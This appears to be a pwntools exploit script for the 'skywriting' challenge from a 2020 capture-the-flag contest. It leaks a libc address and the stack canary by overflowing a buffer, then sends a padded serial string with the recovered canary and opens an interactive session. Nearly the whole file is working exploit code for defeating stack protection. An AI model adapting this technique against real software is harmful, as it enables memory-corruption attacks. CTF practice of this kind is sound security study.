from pwn import *

context.update(log_level='debug')

p = process('bin/skywriting')
#p = remote('2020.redpwnc.tf', 31034)

p.recvrepeat(1)

p.sendline('1')

#raw_input('debug: ' + str(p.pid))
p.recvrepeat(1)

#leak libc
p.sendline('a'*0x37)
_recv = u64(p.recvuntil('??')[-8:-2].ljust(8, '\x00'))

log.info('libc: ' + hex(_recv))

p.recvrepeat(1)



#leak canary
p.send('a'*0x89)
#p.sendlineafter(':', 'a'*0x88)
serial = 'notflag{a_cloud_is_just_someone_elses_computer}\n\x00'
canary = u64(p.recv(0x90)[-7:].rjust(8, '\x00'))
log.info('canary: ' + hex(canary))

#break loop after recover canary
p.recvrepeat(1)
p.send(serial + '\x00'*(0x88-len(serial)) + p64(canary))

p.interactive()
